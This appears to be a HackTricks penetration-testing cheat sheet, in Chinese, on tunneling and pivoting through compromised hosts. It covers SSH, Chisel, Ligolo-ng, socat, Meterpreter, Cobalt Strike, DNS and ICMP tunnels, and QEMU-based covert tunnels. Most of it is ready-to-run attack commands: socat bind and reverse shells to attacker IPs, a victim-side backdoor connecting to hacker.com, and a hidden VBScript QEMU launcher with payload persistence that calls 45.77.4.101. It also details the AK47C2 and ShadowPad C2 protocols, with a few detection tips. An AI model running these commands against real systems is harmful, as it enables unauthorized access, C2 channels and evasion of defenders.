# Tunneling 和 Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 提示

> [!WARNING]
> **ICMP** 和 **SYN** 扫描无法通过 socks proxies 进行 tunnel，因此我们必须**禁用 ping discovery**（`-Pn`），并指定 **TCP scans**（`-sT`）才能正常工作。

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

SSH 图形连接 (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

在 SSH Server 中打开新 Port --> 其他 Port
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

本地端口 --> Compromised host (SSH) --> Third_box:Port
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> 已攻陷主机 (SSH) --> 任意位置
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

这对于通过 DMZ 从内部主机获取 reverse shells 到你的主机非常有用：
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

你需要在**两台设备上都拥有 root 权限**（因为你将创建新的接口），并且 sshd 配置必须允许 root 登录：\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
在 Server 端启用转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端设置一条新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> 2023 年的 Terrapin downgrade attack 可让 man-in-the-middle 篡改 SSH 握手早期阶段，并向 **any forwarded channel**（ `-L`、`-R`、`-D` ）注入数据。在依赖 SSH tunnels 之前，请确保 client 和 server 均已打补丁（**OpenSSH ≥ 9.6/LibreSSH 6.7**），或在 `sshd_config`/`ssh_config` 中明确禁用存在漏洞的 `chacha20-poly1305@openssh.com` 和 `*-etm@openssh.com` algorithms。

## SSHUTTLE

你可以通过主机使用 **ssh** 将所有前往某个 **subnetwork** 的 **traffic** 进行 **tunnel**。\
例如，转发所有前往 10.10.10.0/24 的 traffic
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

本地端口 --> 已攻陷的主机（活动会话） --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

在 teamserver 上开放一个监听于所有接口的端口，可用于**通过 beacon 路由流量**。
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 在此情况下，**端口是在 beacon host 上开放的**，而不是在 Team Server 上开放；流量会发送到 Team Server，然后再从那里转发到指定的 host:port
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
注意：

- Beacon 的 reverse port forward 用于将流量 **tunnel 到 Team Server，而不是在各台机器之间进行 relay**。
- 流量 **tunnel 在 Beacon 的 C2 流量中**，包括 P2P links。
- 在高位端口上创建 reverse port forward **不需要 Admin privileges**。

### rPort2Port local

> [!WARNING]
> 在此情况下，**端口是在 beacon host 上打开的**，而不是在 Team Server 上，且**流量会发送到 Cobalt Strike client**（而不是 Team Server），然后再从那里发送到指定的 host:port
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

你需要上传一个 Web 文件 tunnel：ashx|aspx|js|jsp|php|php|jsp
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

你可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 的 releases 页面下载它\
你需要为 client 和 server 使用**相同的版本**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Use the same version for agent and proxy**

### 隧道
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent 绑定与监听
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 访问 Agent 的本地端口
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel。隧道从 victim 端启动。\
一个 socks4 proxy 会在 127.0.0.1:1080 上创建。
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过 **NTLM proxy** 进行 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port through socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过 SSL Socat 的 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
你可以绕过**未经身份验证的代理**，在受害者的控制台中执行这一行，而不是最后一行：
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat 隧道

**/bin/sh console**

在两端创建 certificates：Client 和 Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

将本地 SSH 端口（22）连接到攻击者主机的 443 端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

它类似于控制台版的 PuTTY（其选项与 ssh 客户端非常相似）。

由于该二进制文件将在受害者主机上执行，并且它是一个 ssh 客户端，因此我们需要开放自己的 ssh 服务和端口，以便建立反向连接。然后，将仅可在本地访问的端口转发到我们机器上的某个端口：
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

你需要具备本地管理员权限（适用于任何端口）
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

你需要在目标系统上拥有 **RDP access**。\
下载：

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows Remote Desktop Service 功能中的 `Dynamic Virtual Channels` (`DVC`)。DVC 负责 **通过 RDP connection 隧道传输数据包**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在你的客户端计算机中按如下方式加载 **`SocksOverRDP-Plugin.dll`**：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在，我们可以使用 **`mstsc.exe`** 通过 **RDP** **连接**到 **victim**，并且应该会收到一条 **提示**，说明 **SocksOverRDP plugin** 已启用，并将 **监听** **127.0.0.1:1080**。

通过 **RDP** **连接**，并将 `SocksOverRDP-Server.exe` 二进制文件上传到 **victim** 机器并执行：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在，在你的机器（攻击者）上确认 1080 端口正在监听：
```
netstat -antb | findstr 1080
```
现在，你可以使用 [**Proxifier**](https://www.proxifier.com/) **通过该端口代理流量。**

## 通过代理转发 Windows GUI 应用

你可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过 proxy 进行访问。\
在 **Profile -> Proxy Servers** 中添加 SOCKS server 的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要进行 proxify 的程序名称，以及要进行 proxify 的目标 IP 连接。

## 绕过 NTLM proxy

前面提到的工具：**Rpivot**\
**OpenVPN** 也可以绕过它，只需在配置文件中设置以下选项：
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

它会针对 proxy 进行认证，并在本地绑定一个 port，将流量转发到你指定的 external service。然后，你可以通过此 port 使用你选择的 tool。\
例如，将 port 443 进行转发
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，例如，如果你将 victim 上的 **SSH** service 设置为监听 443 端口，就可以通过 attacker 的 2222 端口连接到它。\
你也可以使用一个连接到 localhost:443 的 **meterpreter**，而 attacker 监听 2222 端口。

## YARP

由 Microsoft 创建的反向代理。你可以在此处找到它：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

两个系统都需要 Root 权限，以创建 tun adapters，并使用 DNS queries 在它们之间传输数据。
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
该 tunnel 会非常慢。你可以通过使用以下命令创建经过该 tunnel 的压缩 SSH 连接：
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**从这里下载**](https://github.com/iagox86/dnscat2)**。**

通过 DNS 建立 C\&C channel。无需 root 权限。
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 client：
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用 dnscat 进行端口转发**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Change proxychains DNS

Proxychains intercepts `gethostbyname` libc 调用，并通过 socks proxy 隧道传输 tcp DNS 请求。**默认情况下**，proxychains 使用的 **DNS** server 是 **4.2.2.2**（硬编码）。要更改它，请编辑文件：_/usr/lib/proxychains3/proxyresolv_ 并修改 IP。如果你处于 **Windows environment**，可以将 IP 设置为 **domain controller** 的 IP。

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor 创建了一个**双通道 C2（"AK47C2"）**，仅滥用出站 **DNS** 和**明文 HTTP POST** 流量——这两种协议在企业网络中很少被阻断。<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
• 在 *task requests* 前添加 `1`，或在 *results* 前添加 `2`，然后连接不同字段（flags、SessionID、computer name）。
• 每个字段都使用 ASCII key `VHBD@H` 进行 **XOR-encrypted**，再进行 hex-encoded，并用点号连接，最后加上 attacker-controlled domain：

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests 使用 `DnsQuery()` 查询 **TXT**（并回退到 **MG**）records。
• 当 response 超过 0xFF bytes 时，backdoor 将 data **fragments** 为 63-byte pieces，并插入 markers：
`s<SessionID>t<TOTAL>p<POS>`，以便 C2 server 对其重新排序。

2. **HTTP mode (AK47HTTP)**
• 构建一个 JSON envelope：
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 整个 blob 经 XOR-`VHBD@H` → hex → 作为 `POST /` 的 body 发送，header 为 `Content-Type: text/plain`。
• reply 遵循相同的 encoding，并使用 `cmd.exe /c <command> 2>&1` 执行 `cmd` field。

Blue Team notes
• 查找不寻常的 **TXT queries**：其第一个 label 是较长的 hexadecimal，并且总是以一个罕见 domain 结尾。
• 固定 XOR key 后跟 ASCII-hex，很容易使用 YARA 检测：`6?56484244?484`（`VHBD@H` 的 hex）。
• 对于 HTTP，标记 body 为纯 hex 且长度为 two bytes 倍数的 text/plain POST。

{{#note}}
整个 channel 都符合**标准 RFC** queries，并将每个 sub-domain label 控制在 63 bytes 以下，因此在大多数 DNS logs 中都具有隐蔽性。
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

两个系统都需要 Root 才能创建 tun adapters，并使用 ICMP echo requests 在两者之间 tunnel data。
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **是一个通过一条命令将解决方案暴露到 Internet 的工具。**\
_暴露的 URI 类似于：_ **UID.ngrok.io**

### 安装

- 创建账户：https://ngrok.com/signup
- 下载客户端：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_如有需要，也可以添加 authentication 和 TLS。_

#### TCP Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 使用 HTTP 暴露文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### 嗅探 HTTP 请求

_适用于 XSS、SSRF、SSTI ..._\
可直接从 stdout 或 HTTP interface [http://127.0.0.1:4040](http://127.0.0.1:4000) 获取。

#### 隧道传输内部 HTTP 服务
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 简单配置示例

它会打开 3 个隧道：

- 2 个 TCP
- 1 个 HTTP，用于公开来自 /tmp/httpbin/ 的静态文件
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare 的 `cloudflared` daemon 可以创建出站 tunnels，通过 Cloudflare 的 edge 作为 rendez-vous point 暴露 **本地 TCP/UDP 服务**，无需配置入站 firewall rules。当 egress firewall 仅允许 HTTPS traffic、但阻止入站 connections 时，这非常实用。

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### 使用 DNS 的持久化隧道
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
启动连接器：
```bash
cloudflared tunnel run mytunnel
```
由于所有流量都会通过 **443 出站** 离开主机，Cloudflared tunnels 是绕过 ingress ACL 或 NAT 边界的简单方式。请注意，该 binary 通常以提升后的权限运行——尽可能使用 containers 或 `--user` flag。

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) 是一个 actively-maintained 的 Go reverse-proxy，支持 **TCP、UDP、HTTP/S、SOCKS 和 P2P NAT-hole-punching**。从 **v0.53.0（2024 年 5 月）** 开始，它可以充当 **SSH Tunnel Gateway**，因此 target host 只需使用 stock OpenSSH client 即可建立 reverse tunnel——无需额外的 binary。

### 经典 reverse TCP tunnel
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### 使用新的 SSH gateway（无需 frpc binary）
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
上述命令会将受害者的 **8080** 端口发布为 **attacker_ip:9000**，无需部署任何额外工具——非常适合进行 living-off-the-land pivoting。

## 使用 QEMU 的隐蔽基于 VM 的隧道

QEMU 的用户模式网络（`-netdev user`）支持一个名为 `hostfwd` 的选项，可**绑定主机上的 TCP/UDP 端口，并将其转发到 guest 中**。当 guest 运行完整的 SSH daemon 时，hostfwd 规则会为你提供一个完全位于临时 VM 内部的一次性 SSH jump box——非常适合隐藏 C2 流量，避免被 EDR 发现，因为所有恶意活动和文件都保留在虚拟磁盘中。<sup>[[1]](#references)</sup>

### 快速单行命令
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• 上述命令会在 RAM 中启动 **Tiny Core Linux** 镜像（`tc.qcow2`）。
• Windows 主机上的 **2222/tcp** 端口会被透明转发到 guest 内部的 **22/tcp**。
• 从 attacker 的角度来看，目标只暴露了 2222 端口；所有到达该端口的数据包都会由 VM 中运行的 SSH server 处理。

### 通过 VBScript 隐蔽启动
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
使用 `cscript.exe //B update.vbs` 运行脚本会持续隐藏窗口。

### 虚拟机内持久化

由于 Tiny Core 是无状态的，攻击者通常会：

1. 将 payload 写入 `/opt/123.out`
2. 追加到 `/opt/bootlocal.sh`：

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. 将 `home/tc` 和 `opt` 添加到 `/opt/filetool.lst`，这样在关机时 payload 会被打包进 `mydata.tgz`。

### 这种方式为何能规避检测

• 只有两个未签名的可执行文件（`qemu-system-*.exe`）接触磁盘；不会安装驱动或服务。
• 主机上的安全产品看到的是**无害的 loopback 流量**（实际的 C2 在虚拟机内部终止）。
• 内存扫描器永远不会分析恶意进程空间，因为该进程位于另一个 OS 中。

### Defender 检测建议

• 对用户可写路径中出现的**异常 QEMU/VirtualBox/KVM 二进制文件**发出告警。
• 阻止源自 `qemu-system*.exe` 的出站连接。
• 搜索 QEMU 启动后立即绑定的罕见监听端口（2222、10022，……）。

## 通过 `HttpAddUrl` 实现 IIS/HTTP.sys 中继节点（ShadowPad）

Ink Dragon 的 ShadowPad IIS 模块通过直接在 HTTP.sys 层绑定隐蔽的 URL 前缀，将每台被攻陷的边界 Web 服务器变成兼具 **backdoor + relay** 功能的节点：<sup>[[3]](#references)</sup>

* **配置默认值** – 如果模块的 JSON 配置省略了相关值，它会回退到看似正常的 IIS 默认值（`Server: Microsoft-IIS/10.0`、`DocumentRoot: C:\inetpub\wwwroot`、`ErrorPage: C:\inetpub\custerr\en-US\404.htm`）。这样，正常流量就会由 IIS 使用正确的品牌信息进行响应。
* **通配符拦截** – 操作人员提供以分号分隔的 URL 前缀列表（主机和路径中包含通配符）。模块会为每个条目调用 `HttpAddUrl`，因此 HTTP.sys 会将匹配的请求路由到恶意处理程序，*在请求到达 IIS 模块之前*完成处理。
* **加密的第一个数据包** – 请求正文的前两个字节携带自定义 32 位 PRNG 的 seed。协议解析前，后续每个字节都会与生成的密钥流进行 XOR：

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **中继编排** – 模块维护两个列表：“servers”（上游节点）和“clients”（下游 implants）。如果约 30 秒内没有收到 heartbeat，条目就会被清理。当两个列表都不为空时，它会将第一个健康的 server 与第一个健康的 client 配对，然后在双方 socket 之间直接转发字节，直到其中一侧关闭连接。
* **调试遥测** – 可选的日志记录每个配对的源 IP、目标 IP 和转发字节总数。调查人员利用这些线索重建了横跨多个受害者的 ShadowPad mesh。

---

## 其他需要检查的工具

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## References

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
